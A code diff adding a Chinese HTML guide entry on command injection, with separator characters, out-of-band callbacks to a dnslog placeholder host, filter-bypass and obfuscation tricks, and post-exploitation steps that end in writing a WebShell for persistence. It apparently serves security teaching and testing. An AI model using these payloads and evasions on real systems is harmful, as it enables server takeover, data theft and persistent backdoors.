@@ -1,0 +1,12 @@
+<h4>漏洞描述</h4>
+<p>命令注入指程序把用户输入拼接进系统命令（如 <code>shell_exec("ping " . $ip)</code>），攻击者用 <code>&amp;</code>、<code>|</code>、<code>;</code> 等拼接符追加任意命令，直接获得服务器执行权限，是危害最高的漏洞之一。</p>
+<h4>漏洞危害</h4>
+<p>命令执行是危害等级最高的漏洞之一：攻击者直接在服务器上运行系统命令，等同远程登录——可读写任意文件、拖库、植入后门与挖矿木马、以服务器为跳板渗透内网，结合提权漏洞可完全控制主机。一旦利用成功，数据泄露、勒索、挂马都只是后续动作的选择题。</p>
+<h4>挖掘技巧与经验</h4>
+<ul>
+<li>Windows 拼接符：<code>&amp;</code>、<code>&amp;&amp;</code>、<code>|</code>、<code>||</code>；Linux：<code>;</code>、<code>&amp;&amp;</code>、<code>|</code>、<code>||</code>、<code>$()</code>、反引号。</li>
+<li>无回显时用带外验证：<code>ping -c 1 你的域名</code>、<code>curl http://dnslog/...</code>，或用时间盲注。</li>
+<li>空格被过滤时可用 <code>$&#123;IFS&#125;</code>、<code>&lt;</code>、<code>%09</code>、<code>&#123;cat,secret&#125;</code> 代替。</li>
+<li>命令被过滤时尝试变形：<code>c'a't</code>、<code>c\\at</code>、变量拼接、base64 解码执行。</li>
+<li>拿到命令执行后，优先看 <code>whoami</code>、<code>ipconfig/ifconfig</code>、<code>net user</code>，再考虑写 WebShell 持久化。</li>
+</ul>
